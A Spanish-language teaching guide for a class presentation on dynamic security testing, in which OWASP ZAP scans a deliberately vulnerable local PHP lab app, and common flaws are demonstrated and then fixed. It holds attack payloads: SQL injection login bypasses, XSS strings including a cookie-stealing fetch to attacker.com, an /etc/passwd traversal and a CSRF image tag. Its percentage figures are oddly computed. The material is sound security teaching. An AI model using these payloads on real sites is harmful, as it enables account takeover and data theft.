# 🎓 Guía para Presentación en Clase

## 📋 Timeline (70 minutos)

---

## 🎯 1. Introducción (5 min)

### Escenario 4 vs Escenario 2

| Aspecto | Escenario 2 |
|---------|-------------|
| **Tipo** | DAST (Dinámico) |
| **Descripción** | DAST es un análisis de seguridad que se realiza sobre una aplicación en ejecución, simulando ataques reales desde el exterior. |
| **Herramienta** | OWASP ZAP |
| **Analiza** | App ejecutándose |
| **Cuándo** | Post-despliegue |

---

## 💻 2. Demo Aplicación (5 min)

### Mostrar Funcionalidades

```
http://localhost/lab_seguridad

1. Página principal → Presentación
2. Login → admin / admin123
3. Usuarios → CRUD completo
4. Productos → CRUD con comentarios
```

### Señalar Vulnerabilidades Obvias

- ✋ "Vean que las contraseñas están visibles en la tabla"
- ✋ "No hay validación en los formularios"
- ✋ "Los errores SQL se muestran al usuario"

---

## 🔍 3. OWASP ZAP (5 min)

### Cómo Funciona

```
1. SPIDER → Descubre todas las páginas
2. PASSIVE SCAN → Analiza sin atacar
3. ACTIVE SCAN → Prueba exploits reales
4. REPORT → Documenta hallazgos
```

---

## ⚡ 4. Análisis con ZAP (10 min)

### Ejecutar Scan

```
1. Abrir OWASP ZAP
2. Quick Start → http://localhost/lab_seguridad
3. Clic en "Attack"
4. Esperar ~2-3 minutos (demo rápido)
5. Mostrar "Alerts"
```

### Resultados del Análisis

```
🔴 High:          4 vulnerabilidades (22.2%)
🟠 Medium:        4 vulnerabilidades (22.2%)
🟡 Low:           4 vulnerabilidades (22.2%)
ℹ️  Informational: 6 vulnerabilidades (33.3%)
──────────────────────────────────────────────
Total:            18 hallazgos (100%)
```

---

## 🚨 5. Vulnerabilidades Críticas (20 min)

### A. SQL Injection - MySQL 🔴 (30 instancias)

**ZAP Report:** High Risk, Medium Confidence  
**Ubicación:** `POST http://192.168.60.3/app_vulnerable/login.php`

**Código vulnerable:**
```php
$username = $_POST['username'];
$query = "SELECT * FROM usuarios WHERE username = '$username'";
```

**Proque es vulnerable:** Sin sanitización, permite inyección directa.
**Que es sanitización:** Es el proceso de limpiar y validar datos de entrada para evitar ataques.

**Demo en vivo:**
```
Login:
Usuario: ' OR '1'='1
Password: cualquier_cosa
→ ¡Acceso concedido sin credenciales!
```

**Explicación:**
```sql
-- Query inyectada:
SELECT * FROM usuarios WHERE username = '' OR '1'='1' AND ...
-- Resultado: Siempre TRUE
```

**Impacto:** Control total de la BD, bypass de autenticación  
**Instancias encontradas por ZAP:** 30 vulnerabilidades (166.7% del total)

---

### B. XSS Reflejado (Reflected) 🔴 (14 instancias)

**ZAP Report:** High Risk, Medium Confidence  
**Ubicación:** `GET http://192.168.60.3/app_vulnerable/usuarios.php?search=<scrIpt>alert(1);</scRipt>`

**Descripción:** El XSS reflejado se produce cuando los datos proporcionados por el usuario se reflejan en la respuesta del servidor sin la debida validación o escape.

**Código vulnerable:**
```php
$search = $_GET['search'];
echo "<p>Resultados: $search</p>";
```

**Proque es vulnerable:** Sin escape, permite inyección de scripts.
**Que es escape:** Es el proceso de convertir caracteres especiales en entidades HTML para evitar la ejecución de scripts.

**Demo en vivo:**
```
Búsqueda:
<script>alert('XSS')</script>
→ ¡Popup ejecutado!
```

**Payload real:**
```javascript
<script>
  fetch('http://attacker.com/steal?c=' + document.cookie);
</script>
```

**Impacto:** Robo de sesiones, phishing, keylogging  
**Instancias encontradas por ZAP:** 14 vulnerabilidades (77.8% del total)

---

### C. XSS Almacenado (Persistent) 🔴 (9 instancias)

**ZAP Report:** High Risk, Medium Confidence  
**Ubicación:** `GET http://192.168.60.3/app_vulnerable/usuarios.php`

**Descripción:** El XSS almacenado ocurre cuando los datos maliciosos se guardan en el servidor (por ejemplo, en una base de datos) y se muestran a otros usuarios sin la debida validación o escape.

**Diferencia:** Afecta a **TODOS** los usuarios, no solo al atacante

**Demo en vivo:**
```
Crear producto:
Descripción: <img src=x onerror="alert('XSS')">
→ Guardar
→ Cada vez que alguien vea el producto, ejecuta el script
```

**Impacto:** Ataque persistente a todos los visitantes  
**Instancias encontradas por ZAP:** 9 vulnerabilidades (50.0% del total)

---

### D. Path Traversal 🔴 (2 instancias)

**ZAP Report:** High Risk, Low Confidence  
**Ubicación:** `POST http://192.168.60.3/app_vulnerable/usuarios.php?delete=1`

**Descripción:** Permite acceso a archivos fuera del directorio web mediante rutas relativas.

**Código vulnerable:**
```php
$file = $_GET['file'];
include("uploads/" . $file);
```

**Ataque:**
```
?file=../../../etc/passwd
→ Acceso a archivos del sistema
```

**Impacto:** Lectura de archivos sensibles, ejecución de código  
**Instancias encontradas por ZAP:** 2 vulnerabilidades (11.1% del total)

---

### E. Absence of Anti-CSRF Tokens 🟠 (173 instancias)

**ZAP Report:** Medium Risk, Low Confidence  
**Ubicación:** `GET http://192.168.60.3/app_vulnerable/login.php`

**Descripción:** El CSRF (Cross-Site Request Forgery) es un tipo de ataque que fuerza al navegador a ejecutar acciones no deseadas en una aplicación web en la que el usuario está autenticado.

**¿Qué es?** Fuerza al navegador a ejecutar acciones no deseadas

**Código vulnerable:**
```php
// Sin token CSRF
if (isset($_GET['delete'])) {
    $id = $_GET['delete'];
    mysqli_query($conn, "DELETE FROM usuarios WHERE id = $id");
}
```

**Porque es vulnerable:** No verifica el origen de la solicitud.

**Ataque conceptual:**
```html
<!-- Sitio malicioso -->
<img src="http://localhost/lab_seguridad/usuarios.php?delete=1">
```

**Impacto:** Acciones no autorizadas  
**Instancias encontradas por ZAP:** 173 vulnerabilidades (961.1% del total - ¡todos los formularios!)

---

### F. Application Error Disclosure 🟠 (7 instancias)

**ZAP Report:** Medium Risk, Medium Confidence  
**Ubicación:** `POST http://192.168.60.3/app_vulnerable/usuarios.php`

**Problema:** Mensajes de error SQL detallados visibles al usuario

**Ejemplo:**
```
Error: Duplicate entry 'admin' for key 'usuarios.PRIMARY'
→ Revela estructura de BD
```

**Impacto:** Facilita ataques dirigidos  
**Instancias encontradas por ZAP:** 7 vulnerabilidades (38.9% del total)

---

### G. Cookie Security Issues 🟡

**ZAP Report:** Low Risk, Medium Confidence

**Problemas encontrados:**

1. **Cookie No HttpOnly Flag** (1 instancia)
   - Ubicación: `GET http://192.168.60.3/app_vulnerable/login.php`
   - JavaScript puede acceder a `PHPSESSID`

2. **Cookie without SameSite Attribute** (1 instancia)
   - Ubicación: `GET http://192.168.60.3/app_vulnerable/login.php`
   - Vulnerable a CSRF

**HttpOnly:** Evita acceso JS a cookies  
**Secure:** Solo envía cookies sobre HTTPS  
**SameSite:** Previene envío en solicitudes cross-site

**Demo:** Mostrar tabla de usuarios con passwords visibles

**Impacto:** Robo de credenciales, secuestro de sesión

---

## ✅ 6. Correcciones (10 min)

### SQL Injection → Prepared Statements

**Antes:**
```php
$query = "SELECT * FROM usuarios WHERE username = '$username'";
```

**Después:**
```php
$stmt = $pdo->prepare("SELECT * FROM usuarios WHERE username = ?");
$stmt->execute([$username]);
```

---

### XSS → htmlspecialchars()

**Antes:**
```php
echo "<p>$search</p>";
```

**Después:**
```php
$safe = htmlspecialchars($search, ENT_QUOTES, 'UTF-8');
echo "<p>$safe</p>";
```

---

### CSRF → Tokens

**Antes:**
```php
<form method="POST">
    <input name="username">
</form>
```

**Después:**
```php
// Generar
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// Formulario
<form method="POST">
    <input type="hidden" name="csrf_token" 
           value="<?= $_SESSION['csrf_token'] ?>">
    <input name="username">
</form>

// Validar
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('CSRF inválido');
}
```

---

### Passwords → password_hash()

**Antes:**
```php
$password = $_POST['password'];
// Guardar en texto plano
```

**Después:**
```php
$hash = password_hash($_POST['password'], PASSWORD_BCRYPT);
// Guardar $hash

// Verificar
if (password_verify($input, $stored_hash)) {
    // Login exitoso
}
```

---

## 📊 7. Resumen Completo de Vulnerabilidades (5 min)

### Vulnerabilidades Detectadas por ZAP

| Alert Type | Risk | Instancias | % del Total |
|------------|------|------------|-------------|
| **SQL Injection - MySQL** | 🔴 High | 30 | 166.7% |
| **XSS Reflected** | 🔴 High | 14 | 77.8% |
| **XSS Persistent** | 🔴 High | 9 | 50.0% |
| **Path Traversal** | � High | 2 | 11.1% |
| **Absence of Anti-CSRF Tokens** | 🟠 Medium | 173 | 961.1% |
| **Content Security Policy Not Set** | 🟠 Medium | 52 | 288.9% |
| **Missing Anti-clickjacking Header** | � Medium | 49 | 272.2% |
| **Application Error Disclosure** | 🟠 Medium | 7 | 38.9% |
| **Server Leaks Version Info** | 🟡 Low | 54 | 300.0% |
| **X-Content-Type-Options Missing** | 🟡 Low | 50 | 277.8% |
| **Cookie No HttpOnly Flag** | 🟡 Low | 1 | 5.6% |
| **Cookie without SameSite** | 🟡 Low | 1 | 5.6% |
| **User Controllable HTML Attribute** | ℹ️ Info | 77 | 427.8% |
| **Authentication Request Identified** | ℹ️ Info | 8 | 44.4% |
| **Tech Detected (Apache/PHP/Ubuntu)** | ℹ️ Info | 3 | 16.7% |
| **Session Management Response** | ℹ️ Info | 1 | 5.6% |
| **TOTAL ÚNICO** | | **18** | **100%** |

**Nota:** Los porcentajes mayores a 100% indican múltiples instancias de la misma vulnerabilidad.

### Análisis de Impacto

```
🔴 HIGH (4 tipos):     55 instancias totales
🟠 MEDIUM (4 tipos):   281 instancias totales
🟡 LOW (4 tipos):      106 instancias totales
ℹ️  INFO (6 tipos):    89 instancias totales
───────────────────────────────────────────────
TOTAL:                 531 instancias detectadas
```

---

## 📑 8. Otras Vulnerabilidades Detectadas (5 min)

### Headers de Seguridad Faltantes

**Content Security Policy (CSP) Not Set** (52 instancias)
```
Missing Header: Content-Security-Policy
→ No controla qué recursos puede cargar la página
```

**Missing Anti-clickjacking Header** (49 instancias)
```
Missing Header: X-Frame-Options
→ La página puede ser embebida en iframe malicioso
```

**X-Content-Type-Options Missing** (50 instancias)
```
Missing Header: X-Content-Type-Options: nosniff
→ Permite MIME type sniffing attacks
```

### Information Disclosure

**Server Leaks Version Information** (54 instancias)
```
Server: Apache/2.4.52 (Ubuntu)
→ Revela versión exacta del servidor
```

**Tech Detected:**
- Apache HTTP Server
- PHP
- Ubuntu

### Vulnerabilidades Informativas

**User Controllable HTML Element Attribute** (77 instancias)
- Potencial XSS en atributos HTML
- Requiere análisis manual para confirmar

**Authentication Request Identified** (8 instancias)
- ZAP identificó formularios de login
- Útil para mapeo de la aplicación

---

## 🎓 9. Ejercicios Prácticos (10 min)

### Ejercicio 1: SQL Injection

**Tarea:** Bypassear el login sin credenciales

**Payloads a probar:**
- `' OR '1'='1`
- `admin' --`
- `' OR 1=1 --`

**Pregunta:** ¿Por qué funciona?

**Respuesta:** ZAP encontró **30 instancias** de SQL Injection

---

### Ejercicio 2: XSS

**Tarea:** Ejecutar JavaScript en la búsqueda

**Payloads (confirmados por ZAP):**
- `"><scrIpt>alert(1);</scRipt>`
- `<img src=x onerror="alert(1)">`
- `<svg onload="alert('XSS')">`

**Bonus:** ¿Cómo robarías las cookies?

**Respuesta:** ZAP encontró **14 XSS Reflected** + **9 XSS Persistent**

---

## 🎉 Conclusión

### Mensajes Clave

1. ✅ **Automatización es clave** - ZAP detectó **531 instancias** de vulnerabilidades en minutos
2. ✅ **OWASP Top 10 sigue vigente** - 4 de las Top 10 encontradas (Injection, XSS, Broken Auth, CSRF)
3. ✅ **Seguridad desde el inicio** - No es un agregado
4. ✅ **Testing regular** - Análisis continuo en cada release

### Hallazgos Principales del Reporte Real

```
📊 18 tipos únicos de vulnerabilidades
📊 531 instancias totales detectadas
📊 4 vulnerabilidades HIGH
📊 173 formularios sin protección CSRF
📊 30 puntos de SQL Injection
📊 23 puntos de XSS (14 reflected + 9 persistent)
```

### Recursos

- 📚 https://www.zaproxy.org/
- 📚 https://owasp.org/www-project-top-ten/
- 📚 https://portswigger.net/web-security
- 📚 DVWA para práctica
